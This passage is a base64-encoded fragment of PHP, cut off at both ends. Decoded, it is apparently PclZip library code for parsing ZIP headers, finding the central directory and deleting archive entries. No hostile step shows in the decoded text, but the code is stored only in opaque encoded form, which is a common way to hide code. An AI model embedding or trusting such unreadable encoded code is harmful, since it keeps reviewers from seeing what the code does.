kFEX0ZPUk1BVCwgJ0ludmFsaWQgYXJjaGl2ZSBzdHJ1Y3R1cmUnKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAyNik7DQoNCiAgaWYgKHN0cmxlbigkdl9iaW5hcnlfZGF0YSkgIT0gMjYpDQogIHsNCiAgICAkcF9oZWFkZXJbJ2ZpbGVuYW1lJ10gPSAiIjsNCiAgICAkcF9oZWFkZXJbJ3N0YXR1cyddID0gImludmFsaWRfaGVhZGVyIjsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgIkludmFsaWQgYmxvY2sgc2l6ZSA6ICIuc3RybGVuKCR2X2JpbmFyeV9kYXRhKSk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2RhdGEgPSB1bnBhY2soJ3Z2ZXJzaW9uL3ZmbGFnL3Zjb21wcmVzc2lvbi92bXRpbWUvdm1kYXRlL1ZjcmMvVmNvbXByZXNzZWRfc2l6ZS9Wc2l6ZS92ZmlsZW5hbWVfbGVuL3ZleHRyYV9sZW4nLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgJHBfaGVhZGVyWydmaWxlbmFtZSddID0gZnJlYWQoJHRoaXMtPnppcF9mZCwgJHZfZGF0YVsnZmlsZW5hbWVfbGVuJ10pOw0KDQogIGlmICgkdl9kYXRhWydleHRyYV9sZW4nXSAhPSAwKSB7DQogICAgJHBfaGVhZGVyWydleHRyYSddID0gZnJlYWQoJHRoaXMtPnppcF9mZCwgJHZfZGF0YVsnZXh0cmFfbGVuJ10pOw0KICB9DQogIGVsc2Ugew0KICAgICRwX2hlYWRlclsnZXh0cmEnXSA9ICcnOw0KICB9DQoNCiAgJHBfaGVhZGVyWyd2ZXJzaW9uX2V4dHJhY3RlZCddID0gJHZfZGF0YVsndmVyc2lvbiddOw0KICAkcF9oZWFkZXJbJ2NvbXByZXNzaW9uJ10gPSAkdl9kYXRhWydjb21wcmVzc2lvbiddOw0KICAkcF9oZWFkZXJbJ3NpemUnXSA9ICR2X2RhdGFbJ3NpemUnXTsNCiAgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSA9ICR2X2RhdGFbJ2NvbXByZXNzZWRfc2l6ZSddOw0KICAkcF9oZWFkZXJbJ2NyYyddID0gJHZfZGF0YVsnY3JjJ107DQogICRwX2hlYWRlclsnZmxhZyddID0gJHZfZGF0YVsnZmxhZyddOw0KICAkcF9oZWFkZXJbJ2ZpbGVuYW1lX2xlbiddID0gJHZfZGF0YVsnZmlsZW5hbWVfbGVuJ107DQoNCiAgJHBfaGVhZGVyWydtZGF0ZSddID0gJHZfZGF0YVsnbWRhdGUnXTsNCiAgJHBfaGVhZGVyWydtdGltZSddID0gJHZfZGF0YVsnbXRpbWUnXTsNCiAgaWYgKCRwX2hlYWRlclsnbWRhdGUnXSAmJiAkcF9oZWFkZXJbJ210aW1lJ10pDQogIHsNCiAgICAkdl9ob3VyID0gKCRwX2hlYWRlclsnbXRpbWUnXSAmIDB4RjgwMCkgPj4gMTE7DQogICAgJHZfbWludXRlID0gKCRwX2hlYWRlclsnbXRpbWUnXSAmIDB4MDdFMCkgPj4gNTsNCiAgICAkdl9zZWNvbmRlID0gKCRwX2hlYWRlclsnbXRpbWUnXSAmIDB4MDAxRikqMjsNCg0KICAgICR2X3llYXIgPSAoKCRwX2hlYWRlclsnbWRhdGUnXSAmIDB4RkUwMCkgPj4gOSkgKyAxOTgwOw0KICAgICR2X21vbnRoID0gKCRwX2hlYWRlclsnbWRhdGUnXSAmIDB4MDFFMCkgPj4gNTsNCiAgICAkdl9kYXkgPSAkcF9oZWFkZXJbJ21kYXRlJ10gJiAweDAwMUY7DQoNCiAgICAkcF9oZWFkZXJbJ210aW1lJ10gPSBAbWt0aW1lKCR2X2hvdXIsICR2X21pbnV0ZSwgJHZfc2Vjb25kZSwgJHZfbW9udGgsICR2X2RheSwgJHZfeWVhcik7DQoNCiAgfQ0KICBlbHNlDQogIHsNCiAgICAkcF9oZWFkZXJbJ210aW1lJ10gPSB0aW1lKCk7DQogIH0NCg0KDQogICRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10gPSAkcF9oZWFkZXJbJ2ZpbGVuYW1lJ107DQoNCiAgJHBfaGVhZGVyWydzdGF0dXMnXSA9ICJvayI7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdlJlYWRDZW50cmFsRmlsZUhlYWRlcigmJHBfaGVhZGVyKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdl9iaW5hcnlfZGF0YSA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCA0KTsNCiAgJHZfZGF0YSA9IHVucGFjaygnVmlkJywgJHZfYmluYXJ5X2RhdGEpOw0KDQogIGlmICgkdl9kYXRhWydpZCddICE9IDB4MDIwMTRiNTApDQogIHsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgJ0ludmFsaWQgYXJjaGl2ZSBzdHJ1Y3R1cmUnKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCA0Mik7DQoNCiAgaWYgKHN0cmxlbigkdl9iaW5hcnlfZGF0YSkgIT0gNDIpDQogIHsNCiAgICAkcF9oZWFkZXJbJ2ZpbGVuYW1lJ10gPSAiIjsNCiAgICAkcF9oZWFkZXJbJ3N0YXR1cyddID0gImludmFsaWRfaGVhZGVyIjsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgIkludmFsaWQgYmxvY2sgc2l6ZSA6ICIuc3RybGVuKCR2X2JpbmFyeV9kYXRhKSk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICRwX2hlYWRlciA9IHVucGFjaygndnZlcnNpb24vdnZlcnNpb25fZXh0cmFjdGVkL3ZmbGFnL3Zjb21wcmVzc2lvbi92bXRpbWUvdm1kYXRlL1ZjcmMvVmNvbXByZXNzZWRfc2l6ZS9Wc2l6ZS92ZmlsZW5hbWVfbGVuL3ZleHRyYV9sZW4vdmNvbW1lbnRfbGVuL3ZkaXNrL3ZpbnRlcm5hbC9WZXh0ZXJuYWwvVm9mZnNldCcsICR2X2JpbmFyeV9kYXRhKTsNCg0KICBpZiAoJHBfaGVhZGVyWydmaWxlbmFtZV9sZW4nXSAhPSAwKQ0KICAgICRwX2hlYWRlclsnZmlsZW5hbWUnXSA9IGZyZWFkKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnZmlsZW5hbWVfbGVuJ10pOw0KICBlbHNlDQogICAgJHBfaGVhZGVyWydmaWxlbmFtZSddID0gJyc7DQoNCiAgaWYgKCRwX2hlYWRlclsnZXh0cmFfbGVuJ10gIT0gMCkNCiAgICAkcF9oZWFkZXJbJ2V4dHJhJ10gPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkcF9oZWFkZXJbJ2V4dHJhX2xlbiddKTsNCiAgZWxzZQ0KICAgICRwX2hlYWRlclsnZXh0cmEnXSA9ICcnOw0KDQogIGlmICgkcF9oZWFkZXJbJ2NvbW1lbnRfbGVuJ10gIT0gMCkNCiAgICAkcF9oZWFkZXJbJ2NvbW1lbnQnXSA9IGZyZWFkKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnY29tbWVudF9sZW4nXSk7DQogIGVsc2UNCiAgICAkcF9oZWFkZXJbJ2NvbW1lbnQnXSA9ICcnOw0KDQogIGlmICgxKQ0KICB7DQogICAgJHZfaG91ciA9ICgkcF9oZWFkZXJbJ210aW1lJ10gJiAweEY4MDApID4+IDExOw0KICAgICR2X21pbnV0ZSA9ICgkcF9oZWFkZXJbJ210aW1lJ10gJiAweDA3RTApID4+IDU7DQogICAgJHZfc2Vjb25kZSA9ICgkcF9oZWFkZXJbJ210aW1lJ10gJiAweDAwMUYpKjI7DQoNCiAgICAkdl95ZWFyID0gKCgkcF9oZWFkZXJbJ21kYXRlJ10gJiAweEZFMDApID4+IDkpICsgMTk4MDsNCiAgICAkdl9tb250aCA9ICgkcF9oZWFkZXJbJ21kYXRlJ10gJiAweDAxRTApID4+IDU7DQogICAgJHZfZGF5ID0gJHBfaGVhZGVyWydtZGF0ZSddICYgMHgwMDFGOw0KDQogICAgJHBfaGVhZGVyWydtdGltZSddID0gQG1rdGltZSgkdl9ob3VyLCAkdl9taW51dGUsICR2X3NlY29uZGUsICR2X21vbnRoLCAkdl9kYXksICR2X3llYXIpOw0KDQogIH0NCiAgZWxzZQ0KICB7DQogICAgJHBfaGVhZGVyWydtdGltZSddID0gdGltZSgpOw0KICB9DQoNCiAgJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSA9ICRwX2hlYWRlclsnZmlsZW5hbWUnXTsNCg0KICAkcF9oZWFkZXJbJ3N0YXR1cyddID0gJ29rJzsNCg0KICBpZiAoc3Vic3RyKCRwX2hlYWRlclsnZmlsZW5hbWUnXSwgLTEpID09ICcvJykgew0KICAgICRwX2hlYWRlclsnZXh0ZXJuYWwnXSA9IDB4MDAwMDAwMTA7DQogIH0NCg0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZDaGVja0ZpbGVIZWFkZXJzKCYkcF9sb2NhbF9oZWFkZXIsICYkcF9jZW50cmFsX2hlYWRlcikNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCglpZiAoJHBfbG9jYWxfaGVhZGVyWydmaWxlbmFtZSddICE9ICRwX2NlbnRyYWxfaGVhZGVyWydmaWxlbmFtZSddKSB7DQoJfQ0KCWlmICgkcF9sb2NhbF9oZWFkZXJbJ3ZlcnNpb25fZXh0cmFjdGVkJ10gIT0gJHBfY2VudHJhbF9oZWFkZXJbJ3ZlcnNpb25fZXh0cmFjdGVkJ10pIHsNCgl9DQoJaWYgKCRwX2xvY2FsX2hlYWRlclsnZmxhZyddICE9ICRwX2NlbnRyYWxfaGVhZGVyWydmbGFnJ10pIHsNCgl9DQoJaWYgKCRwX2xvY2FsX2hlYWRlclsnY29tcHJlc3Npb24nXSAhPSAkcF9jZW50cmFsX2hlYWRlclsnY29tcHJlc3Npb24nXSkgew0KCX0NCglpZiAoJHBfbG9jYWxfaGVhZGVyWydtdGltZSddICE9ICRwX2NlbnRyYWxfaGVhZGVyWydtdGltZSddKSB7DQoJfQ0KCWlmICgkcF9sb2NhbF9oZWFkZXJbJ2ZpbGVuYW1lX2xlbiddICE9ICRwX2NlbnRyYWxfaGVhZGVyWydmaWxlbmFtZV9sZW4nXSkgew0KCX0NCg0KCWlmICgoJHBfbG9jYWxfaGVhZGVyWydmbGFnJ10gJiA4KSA9PSA4KSB7DQogICAgICAgICRwX2xvY2FsX2hlYWRlclsnc2l6ZSddID0gJHBfY2VudHJhbF9oZWFkZXJbJ3NpemUnXTsNCiAgICAgICAgJHBfbG9jYWxfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSA9ICRwX2NlbnRyYWxfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXTsNCiAgICAgICAgJHBfbG9jYWxfaGVhZGVyWydjcmMnXSA9ICRwX2NlbnRyYWxfaGVhZGVyWydjcmMnXTsNCgl9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdlJlYWRFbmRDZW50cmFsRGlyKCYkcF9jZW50cmFsX2RpcikNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHZfc2l6ZSA9IGZpbGVzaXplKCR0aGlzLT56aXBuYW1lKTsNCiAgQGZzZWVrKCR0aGlzLT56aXBfZmQsICR2X3NpemUpOw0KICBpZiAoQGZ0ZWxsKCR0aGlzLT56aXBfZmQpICE9ICR2X3NpemUpDQogIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsICdVbmFibGUgdG8gZ28gdG8gdGhlIGVuZCBvZiB0aGUgYXJjaGl2ZSBcJycuJHRoaXMtPnppcG5hbWUuJ1wnJyk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2ZvdW5kID0gMDsNCiAgaWYgKCR2X3NpemUgPiAyNikgew0KICAgIEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9zaXplLTIyKTsNCiAgICBpZiAoKCR2X3BvcyA9IEBmdGVsbCgkdGhpcy0+emlwX2ZkKSkgIT0gKCR2X3NpemUtMjIpKQ0KICAgIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgJ1VuYWJsZSB0byBzZWVrIGJhY2sgdG8gdGhlIG1pZGRsZSBvZiB0aGUgYXJjaGl2ZSBcJycuJHRoaXMtPnppcG5hbWUuJ1wnJyk7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgICR2X2JpbmFyeV9kYXRhID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsIDQpOw0KICAgICR2X2RhdGEgPSBAdW5wYWNrKCdWaWQnLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgICBpZiAoJHZfZGF0YVsnaWQnXSA9PSAweDA2MDU0YjUwKSB7DQogICAgICAkdl9mb3VuZCA9IDE7DQogICAgfQ0KDQogICAgJHZfcG9zID0gZnRlbGwoJHRoaXMtPnppcF9mZCk7DQogIH0NCg0KICBpZiAoISR2X2ZvdW5kKSB7DQogICAgaWYgKCR2X21heGltdW1fc2l6ZSA+ICR2X3NpemUpDQogICAgICAkdl9tYXhpbXVtX3NpemUgPSAkdl9zaXplOw0KICAgIEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9zaXplLSR2X21heGltdW1fc2l6ZSk7DQogICAgaWYgKEBmdGVsbCgkdGhpcy0+emlwX2ZkKSAhPSAoJHZfc2l6ZS0kdl9tYXhpbXVtX3NpemUpKQ0KICAgIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgJ1VuYWJsZSB0byBzZWVrIGJhY2sgdG8gdGhlIG1pZGRsZSBvZiB0aGUgYXJjaGl2ZSBcJycuJHRoaXMtPnppcG5hbWUuJ1wnJyk7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgICR2X3BvcyA9IGZ0ZWxsKCR0aGlzLT56aXBfZmQpOw0KICAgICR2X2J5dGVzID0gMHgwMDAwMDAwMDsNCiAgICB3aGlsZSAoJHZfcG9zIDwgJHZfc2l6ZSkNCiAgICB7DQogICAgICAkdl9ieXRlID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsIDEpOw0KDQogICAgICAkdl9ieXRlcyA9ICggKCR2X2J5dGVzICYgMHhGRkZGRkYpIDw8IDgpIHwgT3JkKCR2X2J5dGUpOyANCg0KICAgICAgaWYgKCR2X2J5dGVzID09IDB4NTA0YjA1MDYpDQogICAgICB7DQogICAgICAgICR2X3BvcysrOw0KICAgICAgICBicmVhazsNCiAgICAgIH0NCg0KICAgICAgJHZfcG9zKys7DQogICAgfQ0KDQogICAgaWYgKCR2X3BvcyA9PSAkdl9zaXplKQ0KICAgIHsNCg0KICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9CQURfRk9STUFULCAiVW5hYmxlIHRvIGZpbmQgRW5kIG9mIENlbnRyYWwgRGlyIFJlY29yZCBzaWduYXR1cmUiKTsNCg0KICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgfQ0KICB9DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAxOCk7DQoNCiAgaWYgKHN0cmxlbigkdl9iaW5hcnlfZGF0YSkgIT0gMTgpDQogIHsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgIkludmFsaWQgRW5kIG9mIENlbnRyYWwgRGlyIFJlY29yZCBzaXplIDogIi5zdHJsZW4oJHZfYmluYXJ5X2RhdGEpKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfZGF0YSA9IHVucGFjaygndmRpc2svdmRpc2tfc3RhcnQvdmRpc2tfZW50cmllcy92ZW50cmllcy9Wc2l6ZS9Wb2Zmc2V0L3Zjb21tZW50X3NpemUnLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgaWYgKCgkdl9wb3MgKyAkdl9kYXRhWydjb21tZW50X3NpemUnXSArIDE4KSAhPSAkdl9zaXplKSB7DQoNCiAgaWYgKDApIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsDQogICAgICAgICAgICAgICAgICAgICAgICdUaGUgY2VudHJhbCBkaXIgaXMgbm90IGF0IHRoZSBlbmQgb2YgdGhlIGFyY2hpdmUuJw0KCQkJCQkgICAuJyBTb21lIHRyYWlsaW5nIGJ5dGVzIGV4aXN0cyBhZnRlciB0aGUgYXJjaGl2ZS4nKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQogIH0NCg0KICBpZiAoJHZfZGF0YVsnY29tbWVudF9zaXplJ10gIT0gMCkgew0KICAgICRwX2NlbnRyYWxfZGlyWydjb21tZW50J10gPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkdl9kYXRhWydjb21tZW50X3NpemUnXSk7DQogIH0NCiAgZWxzZQ0KICAgICRwX2NlbnRyYWxfZGlyWydjb21tZW50J10gPSAnJzsNCg0KICAkcF9jZW50cmFsX2RpclsnZW50cmllcyddID0gJHZfZGF0YVsnZW50cmllcyddOw0KICAkcF9jZW50cmFsX2RpclsnZGlza19lbnRyaWVzJ10gPSAkdl9kYXRhWydkaXNrX2VudHJpZXMnXTsNCiAgJHBfY2VudHJhbF9kaXJbJ29mZnNldCddID0gJHZfZGF0YVsnb2Zmc2V0J107DQogICRwX2NlbnRyYWxfZGlyWydzaXplJ10gPSAkdl9kYXRhWydzaXplJ107DQogICRwX2NlbnRyYWxfZGlyWydkaXNrJ10gPSAkdl9kYXRhWydkaXNrJ107DQogICRwX2NlbnRyYWxfZGlyWydkaXNrX3N0YXJ0J10gPSAkdl9kYXRhWydkaXNrX3N0YXJ0J107DQoNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RGVsZXRlQnlSdWxlKCYkcF9yZXN1bHRfbGlzdCwgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KICAkdl9saXN0X2RldGFpbCA9IGFycmF5KCk7DQoNCiAgaWYgKCgkdl9yZXN1bHQ9JHRoaXMtPnByaXZPcGVuRmQoJ3JiJykpICE9IDEpDQogIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfY2VudHJhbF9kaXIgPSBhcnJheSgpOw0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UmVhZEVuZENlbnRyYWxEaXIoJHZfY2VudHJhbF9kaXIpKSAhPSAxKQ0KICB7DQogICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIEByZXdpbmQoJHRoaXMtPnppcF9mZCk7DQoNCiAgJHZfcG9zX2VudHJ5ID0gJHZfY2VudHJhbF9kaXJbJ29mZnNldCddOw0KICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KICBpZiAoQGZzZWVrKCR0aGlzLT56aXBfZmQsICR2X3Bvc19lbnRyeSkpDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9BUkNISVZFX1pJUCwgJ0ludmFsaWQgYXJjaGl2ZSBzaXplJyk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2hlYWRlcl9saXN0ID0gYXJyYXkoKTsNCiAgJGpfc3RhcnQgPSAwOw0KICBmb3IgKCRpPTAsICR2X25iX2V4dHJhY3RlZD0wOyAkaTwkdl9jZW50cmFsX2RpclsnZW50cmllcyddOyAkaSsrKQ0KICB7DQoNCiAgICAkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdID0gYXJyYXkoKTsNCiAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UmVhZENlbnRyYWxGaWxlSGVhZGVyKCR2X2hlYWRlcl9saXN0WyR2X25iX2V4dHJhY3RlZF0pKSAhPSAxKQ0KICAgIHsNCiAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgIH0NCg0KDQogICAgJHZfaGVhZGVyX2xpc3RbJHZfbmJfZXh0cmFjdGVkXVsnaW5kZXgnXSA9ICRpOw0KDQogICAgJHZfZm91bmQgPSBmYWxzZTsNCg0KICAgIGlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdKSkNCiAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXSAhPSAwKSkgew0KDQogICAgICAgIGZvciAoJGo9MDsgKCRqPHNpemVvZigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV0pKSAmJiAoISR2X2ZvdW5kKTsgJGorKykgew0KDQogICAgICAgICAgICBpZiAoc3Vic3RyKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0sIC0xKSA9PSAiLyIpIHsNCg0KICAgICAgICAgICAgICAgIGlmICggICAoc3RybGVuKCR2X2hlYWRlcl9saXN0WyR2X25iX2V4dHJhY3RlZF1bJ3N0b3JlZF9maWxlbmFtZSddKSA+IHN0cmxlbigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV1bJGpdKSkNCiAgICAgICAgICAgICAgICAgICAgJiYgKHN1YnN0cigkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdWydzdG9yZWRfZmlsZW5hbWUnXSwgMCwgc3RybGVuKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0pKSA9PSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV1bJGpdKSkgew0KICAgICAgICAgICAgICAgICAgICAkdl9mb3VuZCA9IHRydWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2VpZiAoICAgKCgkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdWydleHRlcm5hbCddJjB4MDAwMDAwMTApPT0weDAwMDAwMDEwKSANCiAgICAgICAgICAgICAgICAgICAgICAgICYmICgkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdWydzdG9yZWRfZmlsZW5hbWUnXS4nLycgPT0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHZfZm91bmQgPSB0cnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2VpZiAoJHZfaGVhZGVyX2xpc3RbJHZfbmJfZXh0cmFjdGVkXVsnc3RvcmVkX2ZpbGVuYW1lJ10gPT0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkgew0KICAgICAgICAgICAgICAgICR2X2ZvdW5kID0gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KDQogICAgZWxzZSBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9QUkVHXSkpDQogICAgICAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9QUkVHXSAhPSAiIikpIHsNCg0KICAgICAgICBpZiAocHJlZ19tYXRjaCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfUFJFR10sICR2X2hlYWRlcl9saXN0WyR2X25iX2V4dHJhY3RlZF1bJ3N0b3JlZF9maWxlbmFtZSddKSkgew0KICAgICAgICAgICAgJHZfZm91bmQgPSB0cnVlOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgZWxzZSBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF0pKQ0KICAgICAgICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdICE9IDApKSB7DQoNCiAgICAgICAgZm9yICgkaj0kal9zdGFydDsgKCRqPHNpemVvZigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdKSkgJiYgKCEkdl9mb3VuZCk7ICRqKyspIHsNCg0KICAgICAgICAgICAgaWYgKCgkaT49JHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ3N0YXJ0J10pICYmICgkaTw9JHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ2VuZCddKSkgew0KICAgICAgICAgICAgICAgICR2X2ZvdW5kID0gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkaT49JHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ2VuZCddKSB7DQogICAgICAgICAgICAgICAgJGpfc3RhcnQgPSAkaisxOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpZiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ3N0YXJ0J10+JGkpIHsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBlbHNlIHsNCiAgICAJJHZfZm91bmQgPSB0cnVlOw0KICAgIH0NCg0KICAgIGlmICgkdl9mb3VuZCkNCiAgICB7DQogICAgICB1bnNldCgkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdKTsNCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICR2X25iX2V4dHJhY3RlZCsrOw0KICAgIH0NCiAgfQ0KDQogIGlmICgkdl9uYl9leHRyYWN0ZWQgPiAwKSB7DQoNCiAgICAgICR2X3ppcF90ZW1wX25hbWUgPSBQQ0xaSVBfVEVNUE9SQVJZX0RJUi51bmlxaWQoJ3BjbHppcC0nKS4nLnRtcCc7DQoNCiAgICAgICR2X3RlbXBfemlwID0gbmV3IFBjbFppcCgkdl96aXBfdGVtcF9uYW1lKTsNCg0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdl90ZW1wX3ppcC0+cHJpdk9wZW5GZCgnd2InKSkgIT0gMSkgew0KICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCg0KICAgICAgZm9yICgkaT0wOyAkaTxzaXplb2YoJHZfaGVhZGVyX2xpc3QpOyAkaSsrKSB7DQoNCiAgICAgICAgICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KICAgICAgICAgIGlmIChAZnNlZWsoJHRoaXMtPnppcF9mZCwgICR2X2hlYWRlcl9saXN0WyRpXVsnb2Zmc2V0J10pKSB7DQogICAgICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICAgICAkdl90ZW1wX3ppcC0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgQHVubGluaygkdl96aXBfdGVtcF9uYW1lKTsNCg0KICAgICAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVJDSElWRV9aSVAsICdJbnZhbGlkIGFyY2hpdmUgc2l6ZScpOw0KDQogICAgICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICAgIH0NCg0KICAgICAgICAgICR2X2xvY2FsX2hlYWRlciA9IGFycmF5KCk7DQogICAgICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRGaWxlSGVhZGVyKCR2X2xvY2FsX2hlYWRlcikpICE9IDEpIHsNCiAgICAgICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAgICR2X3RlbXBfemlwLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICAgICBAdW5saW5rKCR2X3ppcF90ZW1wX25hbWUpOw0KDQogICAgICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgICAgfQ0KICAgICAgICAgIA0KICAgICAgICAgIGlmICgkdGhpcy0+cHJp